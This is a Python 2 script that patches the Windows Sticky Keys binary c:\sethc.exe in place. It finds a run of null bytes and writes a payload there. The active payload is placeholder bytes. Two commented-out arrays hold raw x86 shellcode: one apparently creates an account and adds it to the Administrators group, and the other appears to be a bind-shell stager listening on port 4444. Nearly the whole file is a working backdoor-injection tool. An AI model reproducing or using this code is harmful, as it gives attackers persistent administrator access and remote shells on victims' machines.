#coding=utf-8
import sys
setch=open('c:\sethc.exe','r+b')
data=setch.read()
bufStart=None
buf=[]
offset=-1;
#toInsert=[0x55,0x8B,0xEC,0x83,0xEC,0x28,0xB9,0x10,0x00,0x00,0x00,0x33,0xC0,0x36,0x8D,0x7C,0x24,0xFC,0xF3,0xAB,0xC6,0x45,0xF8,0x00,0x6A,0x00,0x68,0x6E,0x00,0x64,0x00,0x68,0x79,0x00,0x6F,0x00,0x68,0x62,0x00,0x65,0x00,0x68,0x72,0x00,0x65,0x00,0x8D,0x14,0x24,0x89,0x54,0x24,0x14,0xC6,0x44,0x24,0x20,0x01,0xC6,0x44,0x24,0x2C,0x00,0x8D,0x45,0xF8,0x50,0x8D,0x7C,0x24,0x18,0x57,0x6A,0x01,0x6A,0x00,0xB8,0x7C,0x45,0xE0,0x5F,0xFF,0xD0,0x6A,0x00,0x68,0x72,0x00,0x73,0x00,0x68,0x74,0x00,0x6F,0x00,0x68,0x72,0x00,0x61,0x00,0x68,0x73,0x00,0x74,0x00,0x68,0x6E,0x00,0x69,0x00,0x68,0x6D,0x00,0x69,0x00,0x68,0x41,0x00,0x64,0x00,0x8D,0x34,0x24,0x6A,0x01,0x57,0x6A,0x03,0x56,0x6A,0x00,0xBB,0x34,0x45,0xE0,0x5F,0xFF,0xD3,0x8B,0xE5,0x5D,0xC3]
#toInsert=[0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0b,0x59,0x50,0xe2,0xfd,0x6a,0x01,0x6a,0x02,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0xc2,0xdb,0x37,0x67,0xff,0xd5,0x85,0xc0,0x75,0x58,0x57,0x68,0xb7,0xe9,0x38,0xff,0xff,0xd5,0x57,0x68,0x74,0xec,0x3b,0xe1,0xff,0xd5,0x57,0x97,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x2d,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x07,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3]
toInsert=range(1,100)
print len(data)
found=False
for byte in data:
	offset=offset+1
	if ord(byte)==0x00:
		if bufStart==None:
			bufStart=offset
		buf.append(byte)
		continue
	else:
		if len(buf)>len(toInsert)+6:
			print hex(bufStart+6),hex(len(buf))
			found=True
			#break;
		bufStart=None
		buf=[]
if found:
	offset=-1
	setch.seek(bufStart+6) #避免损坏字符串结尾的null
	setch.write("".join(map(chr,toInsert)))
	setch.flush()
	setch.close()
	'''
	for newByte in toInsert:
		offset=offset+1
		data[bufStart+offset]=newByte
	newFile=open("c:\newFile.exe","wb")
	newFile.write(data)
	newFile.flush()
	newFile.close()
	'''
	print "Done!"
